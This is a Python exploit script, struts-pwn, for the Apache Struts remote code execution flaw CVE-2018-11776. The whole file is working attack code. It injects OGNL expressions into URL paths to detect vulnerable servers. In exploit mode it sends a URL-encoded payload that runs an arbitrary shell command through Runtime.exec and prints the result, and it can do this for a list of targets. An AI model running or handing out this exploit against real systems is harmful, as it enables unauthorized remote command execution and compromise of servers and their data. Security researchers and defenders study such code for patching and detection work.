#!/usr/bin/env python3
# coding=utf-8
# *****************************************************
# struts-pwn: Apache Struts CVE-2018-11776 Exploit
# Author:
# Mazin Ahmed <Mazin AT MazinAhmed DOT net>
# This code uses a payload from:
# https://github.com/jas502n/St2-057
# *****************************************************
 
import argparse
import random
import requests
import sys
try:
    from urllib import parse as urlparse
except ImportError:
    import urlparse
 
# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass
 
if len(sys.argv) <= 1:
    print('[*] CVE: 2018-11776 - Apache Struts2 S2-057')
    print('[*] Struts-PWN - @mazen160')
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)
 
 
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("-c", "--cmd",
                    dest="cmd",
                    help="Command to execute. (Default: 'id')",
                    action='store',
                    default='id')
parser.add_argument("--exploit",
                    dest="do_exploit",
                    help="Exploit.",
                    action='store_true')
 
 
args = parser.parse_args()
url = args.url if args.url else None
usedlist = args.usedlist if args.usedlist else None
cmd = args.cmd if args.cmd else None
do_exploit = args.do_exploit if args.do_exploit else None
 
headers = {
    'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)',
    # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
    'Accept': '*/*'
}
timeout = 3
 
 
def parse_url(url):
    """
    Parses the URL.
    """
 
    # url: http://example.com/demo/struts2-showcase/index.action
 
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')
 
    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme
 
    # Site: http://example.com
    site = scheme + '://' + urlparse.urlparse(url).netloc
 
    # FilePath: /demo/struts2-showcase/index.action
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'
 
    # Filename: index.action
    try:
        filename = url.split('/')[-1]
    except IndexError:
        filename = ''
 
    # File Dir: /demo/struts2-showcase/
    file_dir = file_path.rstrip(filename)
    if (file_dir == ''):
        file_dir = '/'
 
    return({"site": site,
            "file_dir": file_dir,
            "filename": filename})
 
 
def build_injection_inputs(url):
    """
    Builds injection inputs for the check.
    """
 
    parsed_url = parse_url(url)
    injection_inputs = []
    url_directories = parsed_url["file_dir"].split("/")
 
    try:
        url_directories.remove("")
    except ValueError:
        pass
 
    for i in range(len(url_directories)):
        injection_entry = "/".join(url_directories[:i])
 
        if not injection_entry.startswith("/"):
            injection_entry = "/%s" % (injection_entry)
 
        if not injection_entry.endswith("/"):
            injection_entry = "%s/" % (injection_entry)
 
        injection_entry += "{{INJECTION_POINT}}/"  # It will be renderred later with the payload.
        injection_entry += parsed_url["filename"]
 
        injection_inputs.append(injection_entry)
 
    return(injection_inputs)
 
 
def check(url):
    random_value = int(''.join(random.choice('0123456789') for i in range(2)))
    multiplication_value = random_value * random_value
    injection_points = build_injection_inputs(url)
    parsed_url = parse_url(url)
    print("[%] Checking for CVE-2018-11776")
    print("[*] URL: %s" % (url))
    print("[*] Total of Attempts: (%s)" % (len(injection_points)))
    attempts_counter = 0
 
    for injection_point in injection_points:
        attempts_counter += 1
        print("[%s/%s]" % (attempts_counter, len(injection_points)))
        testing_url = "%s%s" % (parsed_url["site"], injection_point)
        testing_url = testing_url.replace("{{INJECTION_POINT}}", "${{%s*%s}}" % (random_value, random_value))
        try:
            resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
        except Exception as e:
            print("EXCEPTION::::--> " + str(e))
            continue
        if "Location" in resp.headers.keys():
            if str(multiplication_value) in resp.headers['Location']:
                print("[*] Status: Vulnerable!")
                return(injection_point)
    print("[*] Status: Not Affected.")
    return(None)
 
 
def exploit(url, cmd):
    parsed_url = parse_url(url)
 
    injection_point = check(url)
    if injection_point is None:
        print("[%] Target is not vulnerable.")
        return(0)
    print("[%] Exploiting...")
 
    payload = """%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{0}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D""".format(cmd)
 
    testing_url = "%s%s" % (parsed_url["site"], injection_point)
    testing_url = testing_url.replace("{{INJECTION_POINT}}", payload)
 
    try:
        resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
    except Exception as e:
        print("EXCEPTION::::--> " + str(e))
        return(1)
 
    print("[%] Response:")
    print(resp.text)
    return(0)
 
 
def main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit):
    if url:
        if not do_exploit:
            check(url)
        else:
            exploit(url, cmd)
 
    if usedlist:
        URLs_List = []
        try:
            f_file = open(str(usedlist), "r")
            URLs_List = f_file.read().replace("\r", "").split("\n")
            try:
                URLs_List.remove("")
            except ValueError:
                pass
            f_file.close()
        except Exception as e:
            print("Error: There was an error in reading list file.")
            print("Exception: " + str(e))
            exit(1)
        for url in URLs_List:
            if not do_exploit:
                check(url)
            else:
                exploit(url, cmd)
 
    print("[%] Done.")
 
 
if __name__ == "__main__":
    try:
        main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit)
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
